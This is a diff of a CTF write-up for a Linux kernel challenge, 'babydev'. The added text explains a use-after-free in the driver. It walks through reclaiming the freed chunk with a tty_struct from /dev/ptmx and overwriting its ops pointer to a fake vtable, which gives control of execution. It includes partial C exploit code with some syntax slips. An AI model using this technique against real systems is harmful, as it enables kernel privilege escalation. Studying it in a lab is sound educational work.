@@ -110,13 +110,13 @@ int fd2 = open("/dev/babydev", O_RDWR, 0);
 close(fd1);
 ```
 
- On first call to open a buffer (let's name it buffer1) of size 0x40 get's allocated and we get a handle fd1. On second call to open we allocate new buffer (name it buffer2), get handle fd2 and we just loose track of the previous one. As c has no garbage collector this leads to memory leaks but it is not vulnerable itself. But then we call close(fd1) and we free the buffer2. The memory chunk get's placed back to kmalloc_cache but we still can access it via fd2. This is standard example of use-after-free vulnerability.
+ On first call to open a buffer (let's name it buffer1) of size 0x40 gets allocated and we get a handle fd1. On second call to open we allocate new buffer (name it buffer2), get handle fd2 and we just loose track of the previous one. As c has no garbage collector this leads to memory leaks but it is not vulnerable itself. But then we call close(fd1) and we free the buffer2. The memory chunk gets placed back to kmalloc_cache but we still can access it via fd2. This is standard example of use-after-free vulnerability.
 
 ## Exploit
 As I had no experience with exploiting use-after-free I used [lexfo](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html) tutorial a lot.ne I really recommend it to anyone who want's to start with kernel exploitation. Moreover I saw some writeups later on and it seems that there is another way to repair the stack with `swapgs` gadget.
 
 ### Gaining control over RIP via tty_struct
-Above in UAF section I've presented a situation where a freed memory chunk get's placed back in kmalloc_cache but we can still write and read on it. To gain control over execution flow we have to force kernel allocator (SLUB) to allocate some object we have control over on the chunk we freed. There are standard techniques for this. One of them is using `tty_struct` object of size 0x2e0 for this (0x2e0 will land in bucket: 2^10).
+Above in UAF section I've presented a situation where a freed memory chunk gets placed back in kmalloc_cache but we can still write and read on it. To gain control over execution flow we have to force kernel allocator (SLUB) to allocate some object we have control over on the chunk we freed. There are standard techniques for this. One of them is using `tty_struct` object of size 0x2e0 for this (0x2e0 will land in bucket: 2^10).
 
 ```c
 int fd1 = open("/dev/babydev", O_RDWR, 0);
@@ -136,9 +136,78 @@ This is how a situation looks like after executing `int fd1 = open("/dev/babydev
 
 ![](img/diagram1.png)
 
+As you can see, the buffer1 of size 0x40 got allocated and we can write/read from it using fd1 descriptor.
+
+Then we open /dev/babydev again: `int fd2 = open("/dev/babydev", O_RDWR, 0);`
+
+![](img/diagram2.png)
+
+And same as before, a new buffer2 gets allocated. We loose track of buffer1, but it doesn't get returned to SLUB allocator as it wasn't directly freed. The super important part here is that we can write/read from the buffer using both fd1 and fd2!!!
+
+Then we just call resize with `ioctl` operation: `ioctl(fd1, 0x10001, 0x2e0);`:
+
+![](img/diagram3.png)
+
+so that when freed, the memory chunk the buffer3 occupies will be placed back to bucket 2^11.
+
+Now we close fd1 with `close(fd1);`:
 
 ![](img/diagram4.png)
 
+The buffer3 gets freed and returned to SLUB allocator. SLUB allocator will then place it inside kmalloc_cache_cpu or inside one of slabs inside kmem_cache_node (in first situation our exploit has more chance to succeed). At the same time we cannot write/read from buffer using fd1 anymore, but we can write/read from buffer using fd2!!!
+
+Now we allocate a struct tty_struct of size 0x2e0 by opening /dev/ptmx: `int tty_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY, 0);`. You can read more about it [here](https://linux.die.net/man/4/ptmx):
+
+![](img/diagram5.png)
+
+As you can see, tty_struct got filled with some data. The interesting field for us is `const struct tty_operations*` which is a pointer to virtual function table. Anytime user invokes a function such as `ioctl`, a kernel will use this pointer to find vtable and then will invoke an `ioctl` function from it:
+
+```c
+struct tty_operations {
+	struct tty_struct * (*lookup)(struct tty_driver *driver,
+			struct file *filp, int idx);
+	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
+    [...]
+	int  (*ioctl)(struct tty_struct *tty,
+    [...]
+};
+
+struct tty_struct {
+	int	magic;
+	struct kref kref;
+	struct device *dev;
+	struct tty_driver *driver;
+	const struct tty_operations *ops;
+    [...]
+};
+```
+
+But remember, we still can access buffer3 and so we can overwrite tty_struct. We will overwrite tty_struct.ops field to point to fake vtable which we will create before. Our payload:
+
+```c
+#define TTY_HDR_SIZE 0x20
+
+int fd1 = open("/dev/babydev", O_RDWR, 0);
+int fd2 = open("/dev/babydev", O_RDWR, 0);
+
+ioctl(fd1, 0x10001, 0x2e0); // resize, so chunk get placed in right bucket
+
+close(fd1);
+
+int tty_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY, 0); // alocates tty_struct of size 0x2e0
+
+struct tty_operations fake_tty_operations;
+memset(fake_tty_operations, 0x41, sizeof(struct tty_operations));
+
+char fake_tty_header[TTY_HDR_SIZE];
+read(fd2, fake_tty_header, sizeof(fake_tty_header); // read first not to overwrite any other values
+/* Overwrite tty_operations field of struct tty pointer to point to fake_tty_operations vtable. */
+*((uint64_t *)fake_tty_header + 3) = (uint64_t)fake_tty_operations;
+write(fd2, fake_tty_header, sizeof(fake_tty_header);
+
+/* triger arbitrary call */
+ioctl(tty_fd, 0, 0);
+```
 
 
 
